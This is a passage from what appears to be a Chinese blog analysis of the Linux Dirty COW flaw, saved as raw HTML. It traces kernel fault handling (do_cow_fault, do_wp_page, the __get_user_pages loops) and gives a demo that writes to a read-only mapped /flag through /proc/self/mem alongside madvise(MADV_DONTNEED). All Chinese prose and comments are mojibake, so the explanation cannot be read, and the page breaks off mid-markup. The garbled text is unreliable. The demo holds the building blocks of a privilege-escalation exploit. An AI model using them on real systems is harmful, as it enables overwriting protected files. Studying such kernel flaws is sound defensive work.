class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED))<br>  copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);<span class="hljs-comment">//æ‹·è´fault_pageå†…å®¹åˆ°new_page</span><br> __SetPageUptodate(new_page);<br><br> ret |= alloc_set_pte(fe, memcg, new_page);<span class="hljs-comment">//è®¾ç½®pteï¼Œç½®æ¢è¯¥è¿›ç¨‹ä¸­çš„pteè¡¨é¡¹ï¼Œå¯¹äºå†™æ“ä½œä¼šå°†è¯¥é¡µæ ‡è„ï¼ˆè¯¥å‡½æ•°ä¼šè°ƒç”¨maybe_mkwrite()å‡½æ•°ï¼Œå…¶ä¼šè°ƒç”¨pte_mkdirty()å‡½æ•°æ ‡è„è¯¥é¡µï¼‰</span><br> <span class="hljs-keyword">if</span> (fe-&gt;pte)<br>  pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br> <span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED)) &#123;<span class="hljs-comment">//é‡Šæ”¾fault_page</span><br>  unlock_page(fault_page);<br>  put_page(fault_page);<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>  dax_unlock_mapping_entry(vma-&gt;vm_file-&gt;f_mapping, pgoff);<br> &#125;<br> <span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>  <span class="hljs-keyword">goto</span> uncharge_out;<br> <span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br> mem_cgroup_cancel_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br> put_page(new_page);<br> <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>alloc_set_pte()</code>æµç¨‹å¦‚ä¸‹, åœ¨æœ¬æµ‹è¯•ç¨‹åºä¸­, ç”±äºè¿›è¡Œ<code>COW</code>çš„<code>VMA</code>åŒºåŸŸä¸å¯å†™å…¥, å› æ­¤å¾—åˆ°çš„<code>COW</code>é¡µåªæœ‰è„æ ‡å¿—, æ²¡æœ‰å¯å†™æ ‡å¿—</p><p>æ³¨æ„è¿™é‡Œçš„<code>set_pte_at()</code>, ä¼šæŠŠæè¿°æ­¤ç‰©ç†é¡µçš„<code>pte</code>å†™å…¥åˆ°<code>vma-&gt;vm_mm</code>è¿™ä¸ªåœ°å€ç©ºé—´çš„é¡µè¡¨ä¸­, ä¹Ÿå°±æ˜¯è®©å…¶ä»–ç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜æ˜ å°„åˆ°è¿™ä¸ªç‰©ç†é¡µä¸­.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_set_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-keyword">struct</span> mem_cgroup *memcg,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> page *page)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br><span class="hljs-type">bool</span> write = fe-&gt;flags &amp; FAULT_FLAG_WRITE;<br><span class="hljs-type">pte_t</span> entry;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (pmd_none(*fe-&gt;pmd) &amp;&amp; PageTransCompound(page) &amp;&amp;<br>IS_ENABLED(CONFIG_TRANSPARENT_HUGE_PAGECACHE)) &#123;<br><span class="hljs-comment">/* THP on COW? */</span><br>VM_BUG_ON_PAGE(memcg, page);<br><br>ret = do_set_pmd(fe, page);<br><span class="hljs-keyword">if</span> (ret != VM_FAULT_FALLBACK)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<br>ret = pte_alloc_one_map(fe);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* Re-check under ptl */</span><br><span class="hljs-keyword">if</span> (unlikely(!pte_none(*fe-&gt;pte)))<br><span class="hljs-keyword">return</span> VM_FAULT_NOPAGE;<br><br>flush_icache_page(vma, page);<br>entry = mk_pte(page, vma-&gt;vm_page_prot);<span class="hljs-comment">//æ ¹æ®é¡µç‰©ç†åœ°å€ä¸VMAæƒé™ç”ŸæˆPTE</span><br><span class="hljs-keyword">if</span> (write) <span class="hljs-comment">//pte_mkdirtyä¼šç»™PTEåŠ ä¸Šè„ä½</span><br>entry = maybe_mkwrite(pte_mkdirty(entry), vma); <span class="hljs-comment">//å¦‚æœè¿™ç‰‡VMAå¯å†™ï¼Œé‚£ä¹ˆmaybe_mkwrite()ä¼šç»™PTEåŠ ä¸Šå¯å†™ä½</span><br><span class="hljs-comment">/* copy-on-write page */</span><br>    <span class="hljs-comment">//å»ºç«‹åå‘æ˜ å°„ï¼šä»pageå¯¹è±¡è§¦å‘ï¼Œæ‰¾åˆ°æ˜ å°„åˆ°æ­¤çš„VMA</span><br><span class="hljs-keyword">if</span> (write &amp;&amp; !(vma-&gt;vm_flags &amp; VM_SHARED)) &#123;<br>inc_mm_counter_fast(vma-&gt;vm_mm, MM_ANONPAGES);<br>page_add_new_anon_rmap(page, vma, fe-&gt;address, <span class="hljs-literal">false</span>);<br>mem_cgroup_commit_charge(page, memcg, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>lru_cache_add_active_or_unevictable(page, vma);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>inc_mm_counter_fast(vma-&gt;vm_mm, mm_counter_file(page));<br>page_add_file_rmap(page, <span class="hljs-literal">false</span>);<br>&#125;<br>    <span class="hljs-comment">//åœ¨é¡µè¡¨ä¸­è®¾ç½®PTE</span><br>set_pte_at(vma-&gt;vm_mm, fe-&gt;address, fe-&gt;pte, entry);<br><br><span class="hljs-comment">/* no need to invalidate: a not-present page won&#x27;t be cached */</span><br>    <span class="hljs-comment">//æ›´æ–°MMUç¼“å­˜</span><br>update_mmu_cache(vma, fe-&gt;address, fe-&gt;pte);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><ul><li></li></ul></li></ul><p>è°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">faultin_page</span>()<br><span class="hljs-built_in">handle_mm_fault</span>()<br><span class="hljs-built_in">__handle_mm_fault</span>()<br><span class="hljs-built_in">handle_pte_fault</span>()<br><span class="hljs-built_in">do_fault</span>()<br><span class="hljs-built_in">do_cow_fault</span>()<br><span class="hljs-built_in">alloc_set_pte</span>()<br><span class="hljs-built_in">maybe_mkwrite</span>()<br><span class="hljs-built_in">pte_mkdirty</span>()<br><br></code></pre></td></tr></table></figure><h4 id="get-user-pagesã®ç¬¬äºŒæ¬¡å¾ªç¯"><a href="#get-user-pagesã®ç¬¬äºŒæ¬¡å¾ªç¯" class="headerlink" title="__get_user_pagesã®ç¬¬äºŒæ¬¡å¾ªç¯"></a>__get_user_pagesã®ç¬¬äºŒæ¬¡å¾ªç¯</h4><p>åˆ†é…åˆ°<code>COW</code>é¡µä¹‹åå›åˆ°<code>retry</code>ï¼Œç¬¬äºŒæ¬¡è¿›å…¥<code>follow_page_mask()</code>ï¼Œè¿™æ¬¡ä¸€åˆ‡æ­£å¸¸ï¼Œè¿›å…¥<code>follow_page_pte()</code></p><p>butç”±äº<code>PTE</code>ä¸å¯å†™å…¥, ä¸”<code>flags</code>ä¸­è®¾ç½®äº†<strong>FOLL_WRITE</strong>æ ‡å¿—, å› æ­¤ä¼šå†æ¬¡å¤±è´¥ï¼Œ<code>follow_page_mask()</code>è¿”å›å€¼ä¸º<strong>NULL</strong>ï¼Œç»§ç»­è¿›å…¥<code>faultin_page</code>å¤„ç†ç¼ºé¡µå¼‚å¸¸</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//å¦‚æœè¦æ±‚å†™å…¥ï¼Œä½†æ˜¯pteè¡¨ç¤ºä¸å¯å†™å…¥</span><br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºè¦è¿›è¡Œå†™å…¥æ“ä½œ, å¹¶ä¸”å¯¹åº”é¡µå­˜åœ¨, å› æ­¤<code>handle_pte_fault()</code>ä¼šè°ƒç”¨<code>do_wp_page()</code>è¿›è¡Œå†™æ—¶å¤åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;<span class="hljs-comment">//å­˜åœ¨ FAULT_FLAG_WRITE æ ‡å¿—ä½ï¼Œè¡¨ç¤ºç¼ºé¡µå¼‚å¸¸ç”±å†™æ“ä½œå¼•èµ·</span><br><span class="hljs-keyword">if</span> (!pte_write(entry))<span class="hljs-comment">//å¯¹åº”çš„é¡µä¸å¯å†™</span><br><span class="hljs-keyword">return</span> do_wp_page(fe, entry);<span class="hljs-comment">//è¿›è¡Œå†™æ—¶å¤åˆ¶ï¼Œå°†å†…å®¹å†™å…¥ç”± do_fault()-&gt;do_cow_fault()åˆ†é…çš„å†…å­˜é¡µä¸­</span><br></code></pre></td></tr></table></figure><p><code>do_wp_page()</code>æµç¨‹å¦‚ä¸‹</p><ul><li><ul><li>è°ƒç”¨<code>vm_normal_page()</code> æ ¹æ®<code>address</code>æ‰¾åˆ°å¯¹åº”çš„é¡µæè¿°ç¬¦</li><li>å¦‚æœå‘ç°æ˜¯åŒ¿åé¡µ, å¹¶ä¸”æ­¤é¡µåªæœ‰ä¸€ä¸ªå¼•ç”¨, é‚£ä¹ˆä¼šè°ƒç”¨<code>wp_page_reuse()</code>ç›´æ¥é‡ç”¨è¿™ä¸ªé¡µ.</li><li>ç¬¬ä¸€æ¬¡<code>faultin_page()</code>æ—¶è¿›å…¥<code>do_cow_fault()</code>, å°±å·²ç»ä¸“é—¨å¤åˆ¶äº†ä¸€é¡µ, å› æ­¤ä¼šç›´æ¥è¿›å…¥<code>wp_page_reuse()</code> é‡ç”¨è¿™ä¸ªé¡µ</li></ul></li><li></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//èƒ½å¦é‡ç”¨ä¸€ä¸ªé¡µ</span><br><span class="hljs-keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) &#123;<br>    <span class="hljs-comment">//å¦‚æœè¿™ä¸ªåŒ¿åé¡µåªæœ‰ä¸€ä¸ªæ˜ å°„ï¼Œé‚£ä¹ˆä¸ç”¨é‡æ–°åˆ†é…é¡µï¼Œç›´æ¥æŠŠæ—§é¡µæ‹¿å»å†™</span><br><span class="hljs-keyword">if</span> (total_mapcount == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The page is all ours. Move it to</span><br><span class="hljs-comment"> * our anon_vma so the rmap code will</span><br><span class="hljs-comment"> * not search our parent or siblings.</span><br><span class="hljs-comment"> * Protected against the rmap code by</span><br><span class="hljs-comment"> * the page lock.</span><br><span class="hljs-comment"> */</span><br>                <span class="hljs-comment">//æŠŠæ—§ä¸šæ”¾åˆ°anon_vmaä¸­ï¼Œè¿™ä¸ªæ¶‰åŠåˆ°åå‘æ˜ å°„</span><br>page_move_anon_rmap(old_page, vma);<br>&#125;<br>unlock_page(old_page);<br>    <span class="hljs-comment">//æ—§é¡µåªå±äºè¿™ä¸ªè¿›ç¨‹ï¼Œå°è¯•ç»™PTEåŠ ä¸Šå¯å†™å…¥æ ‡å¿—</span><br><span class="hljs-keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>wp_page_reuse()</code>ä¸»è¦å°±æ˜¯è®¾ç½®<strong>PTE</strong>, ç„¶åè¿”å›<strong>VM_FAULT_WRITE</strong></p><ul><li><ul><li>æ³¨æ„ç”±äºè¿™ç‰‡<strong>VMA</strong>ä¸å¯å†™å…¥,å› æ­¤<strong>PTE</strong>ä»»ç„¶æ²¡æœ‰<strong>RW</strong>æ ‡å¿—,</li></ul></li><li></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">wp_page_reuse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pte_t</span> orig_pte,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">int</span> page_mkwrite, <span class="hljs-type">int</span> dirty_shared)</span><br>__<span class="hljs-title function_">releases</span><span class="hljs-params">(fe-&gt;ptl)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br><span class="hljs-type">pte_t</span> entry;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear the pages cpupid information as the existing</span><br><span class="hljs-comment"> * information potentially belongs to a now completely</span><br><span class="hljs-comment"> * unrelated process.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page)<br>page_cpupid_xchg_last(page, (<span class="hljs-number">1</span> &lt;&lt; LAST_CPUPID_SHIFT) - <span class="hljs-number">1</span>);<br><br>flush_cache_page(vma, fe-&gt;address, pte_pfn(orig_pte));<br>entry = pte_mkyoung(orig_pte);<span class="hljs-comment">//æ ‡è®°ä¸‹åˆšåˆšè®¿é—®è¿‡</span><br>entry = maybe_mkwrite(pte_mkdirty(entry), vma);  <span class="hljs-comment">//è®¾ç½®è„ä½ï¼Œå¦‚æœVMAå¯å†™çš„è¯è®¾ç½®å†™å…¥ä½</span><br><span class="hljs-keyword">if</span> (ptep_set_access_flags(vma, fe-&gt;address, fe-&gt;pte, entry, <span class="hljs-number">1</span>))   <span class="hljs-comment">//å†™å…¥PTE</span><br>update_mmu_cache(vma, fe-&gt;address, fe-&gt;pte); <span class="hljs-comment">//æ›´æ–°mmuç¼“å­˜</span><br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><br><span class="hljs-keyword">if</span> (dirty_shared) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span>;</span><br><span class="hljs-type">int</span> dirtied;<br><br><span class="hljs-keyword">if</span> (!page_mkwrite)<br>lock_page(page);<br><br>dirtied = set_page_dirty(page);<br>VM_BUG_ON_PAGE(PageAnon(page), page);<br>mapping = page-&gt;mapping;<br>unlock_page(page);<br>put_page(page);<br><br><span class="hljs-keyword">if</span> ((dirtied || page_mkwrite) &amp;&amp; mapping) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Some device drivers do not set page.mapping</span><br><span class="hljs-comment"> * but still dirty their pages</span><br><span class="hljs-comment"> */</span><br>balance_dirty_pages_ratelimited(mapping);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!page_mkwrite)<br>file_update_time(vma-&gt;vm_file);<br>&#125;<br>    <span class="hljs-keyword">return</span> VM_FAULT_WRITE; <span class="hljs-comment">//è¿”å›è¿™ä¸ªæ ‡å¿—è¡¨ç¤ºè¿›è¡ŒCOWä¹‹åï¼Œè¿™ä¸ªé¡µå¯ä»¥å†™å…¥äº†</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€å<code>handle_mm_fault()</code>è¿”å›åˆ°<code>faultin_page()</code>ä¸­æ—¶, ç”±äºè¿”å›äº†<strong>VM_FAULT_WRIT</strong>Eæ ‡å¿—, è¡¨ç¤ºå¯ä»¥å†™å…¥, å› æ­¤ä¼šå»æ‰<code>flags</code>ä¸­çš„<strong>FOLL_WRITE</strong>æ ‡å¿—, ä¸å†æ£€æŸ¥å†™å…¥æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>*flags &amp;= ~FOLL_WRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">faultin_page</span>()<br><span class="hljs-built_in">handle_mm_fault</span>()<br><span class="hljs-built_in">__handle_mm_fault</span>()<br><span class="hljs-built_in">handle_pte_fault</span>()<br><span class="hljs-built_in">do_fault</span>()<br><span class="hljs-built_in">do_wp_page</span>()<br><span class="hljs-built_in">wp_page_reuse</span>()<br><span class="hljs-built_in">maybe_mkwrite</span>(pte_mkdirty(entry), vma);<br>                          return VM_FAULT_WRITE;<br></code></pre></td></tr></table></figure><h4 id="get-user-pagesã®ç¬¬ä¸‰æ¬¡å¾ªç¯"><a href="#get-user-pagesã®ç¬¬ä¸‰æ¬¡å¾ªç¯" class="headerlink" title="__get_user_pagesã®ç¬¬ä¸‰æ¬¡å¾ªç¯"></a>__get_user_pagesã®ç¬¬ä¸‰æ¬¡å¾ªç¯</h4><p>ç¬¬ä¸‰æ¬¡è¿›å…¥<code>follow_page_mask()</code>, ç”±äºä¹‹å‰å»æ‰äº†<strong>FOLL_WRITE</strong>æ ‡å¿—, å› æ­¤ä¸ä¼šæ£€æŸ¥<strong>PTE</strong>æœ‰æ²¡æœ‰å†™å…¥æƒé™, ä»è€Œé€šè¿‡<code>follow_page_mask()</code>è¿”å›å¯¹åº”çš„é¡µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//å¦‚æœè¦æ±‚å†™å…¥ï¼Œä½†æ˜¯pteè¡¨ç¤ºä¸å¯å†™å…¥</span><br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>ä¹‹åä¼šæ²¿ç€è·¯å¾„è¿”å›: <code>get_user_pages() -&gt;__ get_user_pages_locked() -&gt; get_user_page_remote() -&gt; __access_remote_vm()</code></li><li><code>__access_remote_vm()</code>é”å®šé¡µé¢å, å…ˆè°ƒç”¨<code>kmap</code>æŠŠé¡µé¢æ˜ å°„åˆ°å†…æ ¸åœ°å€ç©ºé—´ä¸­, å†è°ƒç”¨<code>copy_to_user_page()</code>å®Œæˆä»å†…æ ¸ç¼“å†²åŒºåˆ°å¯¹åº”é¡µé¢çš„å†™å…¥</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//æ­¤æ—¶çš„pageä¸ºget_user_pages_remote()ä¸ºç”¨æˆ·å¯»æ‰¾çš„ï¼Œæ˜¯è¢«é”å®šåœ¨å†…å­˜ä¸­çš„é¡µï¼Œkmapå°†å…¶æ˜ å°„åœ¨å†…æ ¸åœ°å€ç©ºé—´ä¸­</span><br>maddr = kmap(page);<br><span class="hljs-keyword">if</span> (write) &#123;<span class="hljs-comment">//å†™å…¥è¯·æ±‚</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                å…ˆè°ƒç”¨copy_to_user_page()è¿›è¡Œå†™å…¥</span><br><span class="hljs-comment">                maddrä¸ºæ ¹æ®addré”å®šçš„é¡µï¼Œoffsetä¸ºaddré¢é¡µå†…åç§»ï¼Œä¸¤è€…ç›¸åŠ å°±æ˜¯è¦å†™å…¥çš„åœ°å€</span><br><span class="hljs-comment">                ç­‰ä»·ä¸ºï¼šmemcpy(maddr + offset, buf, bytes)</span><br><span class="hljs-comment">                */</span><br>copy_to_user_page(vma, page, addr,<br>  maddr + offset, buf, bytes);<br></code></pre></td></tr></table></figure><h2 id="madviseã®ä½¿ç”¨æ–¹æ³•"><a href="#madviseã®ä½¿ç”¨æ–¹æ³•" class="headerlink" title="madviseã®ä½¿ç”¨æ–¹æ³•"></a>madviseã®ä½¿ç”¨æ–¹æ³•</h2><p><code>madvise()</code>ç³»ç»Ÿæ‰ç”¨ï¼Œç”¨äºå‘å†…æ ¸æä¾›å¯¹äºèµ·å§‹åœ°å€ä¸º<code>addr</code>ï¼Œé•¿åº¦ä¸º<code>length</code>çš„å†…å­˜ç©ºé—´çš„æ“ä½œå»ºè®®æˆ–è€…æŒ‡ç¤ºã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ­¤ç±»å»ºè®®çš„ç›®æ ‡æ˜¯æé«˜ç³»ç»Ÿæˆ–è€…åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚</p><h4 id="æµ‹è¯•demo-1"><a href="#æµ‹è¯•demo-1" class="headerlink" title="æµ‹è¯•demo"></a>æµ‹è¯•demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">processMem</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    lseek(f, mem, SEEK_SET);<br>    write(f, <span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, (<span class="hljs-type">char</span> *)mem);<br><br>    madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDONLY);<br>    fstat(fd, &amp;st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);<br><br>    processMem();<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="sys-madvise"><a href="#sys-madvise" class="headerlink" title="sys_madvise()"></a>sys_madvise()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 